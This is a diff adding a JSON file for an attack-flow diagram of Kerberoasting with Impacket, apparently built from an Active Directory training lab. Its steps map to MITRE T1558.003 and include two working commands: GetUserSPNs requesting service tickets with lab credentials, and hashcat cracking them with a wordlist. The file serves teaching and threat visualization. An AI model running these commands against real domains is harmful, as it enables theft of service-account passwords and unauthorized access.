@@ -1,0 +1,135 @@
+{
+  "title": "Impacket Kerberoasting",
+  "version": "3.0",
+  "entities": [
+    {
+      "id": "attacker_machine",
+      "label": "Attacker Environment",
+      "type": "container",
+      "icon": "IconKali",
+      "members": [
+        "impacket_tool",
+        "service_hashes",
+        "cracked_tickets"
+      ],
+      "position": {
+        "x": 512.05,
+        "y": 137
+      }
+    },
+    {
+      "id": "impacket_tool",
+      "label": "GetUserSPNs.py",
+      "type": "node",
+      "icon": "IconTerminal",
+      "position": {
+        "x": 607.6,
+        "y": 72.95
+      }
+    },
+    {
+      "id": "service_hashes",
+      "label": "Kerberoast Hashes",
+      "type": "node",
+      "icon": "IconData",
+      "position": {
+        "x": 416.5,
+        "y": 201.05
+      }
+    },
+    {
+      "id": "cracked_tickets",
+      "label": "Cracked Service Passwords",
+      "type": "node",
+      "icon": "IconData",
+      "position": {
+        "x": 607.6,
+        "y": 201.05
+      }
+    },
+    {
+      "id": "corporate_network",
+      "label": "Corporate Network",
+      "type": "container",
+      "icon": "IconNetwork",
+      "members": [
+        "domain_controller"
+      ],
+      "position": {
+        "x": 78.39999999999998,
+        "y": 201.05
+      }
+    },
+    {
+      "id": "domain_controller",
+      "label": "Domain Controller (KDC)",
+      "type": "node",
+      "icon": "IconServer",
+      "position": {
+        "x": 78.39999999999998,
+        "y": 201.05
+      }
+    }
+  ],
+  "steps": [
+    {
+      "id": 1,
+      "name": "Launch GetUserSPNs",
+      "type": "edge",
+      "from": "attacker_machine",
+      "to": "impacket_tool",
+      "description": "The attacker starts Impacket GetUserSPNs with valid credentials and ticket-request mode enabled.",
+      "cli": "impacket-GetUserSPNs marvel.local/fcastle:Password1 -dc-ip 10.0.2.71 -request"
+    },
+    {
+      "id": 2,
+      "name": "Reach Domain KDC Services",
+      "type": "edge",
+      "from": "impacket_tool",
+      "to": "corporate_network",
+      "description": "The Kerberoast client reaches the corporate directory and KDC services needed to enumerate SPNs and request tickets."
+    },
+    {
+      "id": 3,
+      "name": "Enumerate SPNs and Request TGS",
+      "type": "edge",
+      "from": "corporate_network",
+      "to": "domain_controller",
+      "description": "The Domain Controller identifies SPN-bearing accounts and issues service tickets for those principals.",
+      "mitre": {
+        "id": "T1558.003",
+        "tactic": "Credential Access",
+        "technique": "Steal or Forge Kerberos Tickets: Kerberoasting"
+      }
+    },
+    {
+      "id": 4,
+      "name": "Save Kerberoast Hashes",
+      "type": "edge",
+      "from": "domain_controller",
+      "to": "service_hashes",
+      "description": "The returned TGS material is exported in crackable hash format for offline attack."
+    },
+    {
+      "id": 5,
+      "name": "Crack Service Passwords",
+      "type": "edge",
+      "from": "service_hashes",
+      "to": "cracked_tickets",
+      "description": "Hashcat attacks the extracted ticket material to recover service-account plaintext passwords.",
+      "cli": "hashcat -m 13100 ~/AD-CyberMentor/Kerberoasting/service_hash.txt /usr/share/wordlists/rockyou.txt -O --potfile-disable"
+    }
+  ],
+  "visibility": {
+    "service_hashes": {
+      "start": 4,
+      "end": 100
+    },
+    "cracked_tickets": {
+      "start": 5,
+      "end": 100
+    }
+  },
+  "attackMatrixOpen": false,
+  "sizeControlsOpen": false
+}
